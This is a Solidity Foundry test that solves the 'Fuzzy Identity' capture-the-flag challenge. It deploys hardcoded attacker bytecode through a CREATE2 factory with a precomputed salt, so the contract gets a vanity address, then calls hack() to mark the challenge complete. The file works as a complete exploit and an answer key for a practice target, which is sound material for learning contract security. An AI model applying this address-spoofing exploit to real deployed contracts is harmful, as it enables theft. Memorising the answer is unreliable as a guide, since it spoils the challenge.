// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

import "forge-std/Test.sol";
import "./FuzzyIdentityChallenge.sol";
import "./Factory.sol";

interface IAttacker {
    function hack(address) external;
}

contract FuzzyIdentityChallengeTest is Test {
    FuzzyIdentityChallenge public fuzzyIdentityChallenge;
    FactoryAssembly factoryAsm;
    address hacker = makeAddr("hacker");

    function setUp() public {
        fuzzyIdentityChallenge = new FuzzyIdentityChallenge();

        vm.startPrank(hacker);
        factoryAsm = new FactoryAssembly();
        vm.stopPrank();
    }

    function testGetBytecodeAndFactoryAddr() public {
        emit log_named_address("factory address", address(factoryAsm));

        bytes memory bytecode = factoryAsm.getBytecode();
        emit log_named_bytes("bytecode", bytecode);
        address attacker = factoryAsm.getAddress(bytecode, 0);
        emit log_named_address("attacker address", attacker);
    }

    function testFuzzyIdentity() public {
        vm.startPrank(hacker);
        emit log_named_string("before hack, isComplete", fuzzyIdentityChallenge.isComplete() ? "true" : "false");

        bytes memory bytecode =
            hex"608060405234801561001057600080fd5b50610121806100206000396000f3fe6080604052348015600f57600080fd5b506004361060325760003560e01c806306fdde031460375780636c4c174f146052575b600080fd5b640e6dac2e4f60db1b60405190815260200160405180910390f35b6061605d36600460bd565b6063565b005b6000819050806001600160a01b031663380c7a676040518163ffffffff1660e01b8152600401600060405180830381600087803b15801560a257600080fd5b505af115801560b5573d6000803e3d6000fd5b505050505050565b60006020828403121560ce57600080fd5b81356001600160a01b038116811460e457600080fd5b939250505056fea2646970667358221220fc6cbe37060c23bc84c7e434ee1e21e1304fd6a3a1ae223a7643f28b0fa784aa64736f6c63430008130033";
        uint256 salt = 11044009889962758569;

        address attackerAddr = factoryAsm.deploy(bytecode, salt);
        IAttacker attacker = IAttacker(attackerAddr);

        attacker.hack(address(fuzzyIdentityChallenge));

        emit log_named_string("after hack, isComplete", fuzzyIdentityChallenge.isComplete() ? "true" : "false");

        assertTrue(fuzzyIdentityChallenge.isComplete());
    }
}
